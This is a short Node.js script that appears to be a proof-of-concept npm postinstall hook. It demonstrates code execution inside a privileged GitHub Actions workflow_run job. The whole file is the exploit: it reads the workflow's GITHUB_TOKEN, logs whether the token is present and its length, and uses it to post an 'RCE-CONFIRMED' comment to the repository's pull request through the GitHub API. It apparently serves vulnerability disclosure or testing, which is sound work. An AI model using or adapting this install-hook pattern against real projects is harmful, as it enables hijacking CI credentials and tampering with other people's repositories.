const fs = require('fs');
(async () => {
  const token = process.env.GITHUB_TOKEN || '';
  const repo = process.env.GITHUB_REPOSITORY || 'PDFtoMark/gab-poc-adp-linter';
  const runId = process.env.GITHUB_RUN_ID;
  const line = 'RCE-POSTINSTALL-OK run=' + runId + ' actor=' + process.env.GITHUB_ACTOR +
    ' token_present=' + !!token + ' token_len=' + token.length + ' repo=' + repo;
  console.log(line);
  try {
    const prNumber = (fs.existsSync('../../pr-number.txt') ? fs.readFileSync('../../pr-number.txt', 'utf8').trim() : '') || '1';
    const res = await fetch('https://api.github.com/repos/' + repo + '/issues/' + prNumber + '/comments', {
      method: 'POST',
      headers: {
        Authorization: 'Bearer ' + token,
        Accept: 'application/vnd.github+json',
        'Content-Type': 'application/json',
        'X-GitHub-Api-Version': '2022-11-28'
      },
      body: JSON.stringify({
        body: 'RCE-CONFIRMED: attacker npm lifecycle hook executed inside the privileged workflow_run job and used the workflow GITHUB_TOKEN to post this comment. run=' + runId + ' actor=' + process.env.GITHUB_ACTOR
      })
    });
    const j = await res.json();
    console.log('comment status', res.status, 'url', j.html_url || j.message);
  } catch (e) { console.log('comment error', e.message); }
  try { fs.appendFileSync('../../linter-report.txt', '\n' + line + '\n'); } catch (e) { console.log('append failed', e.message); }
})();
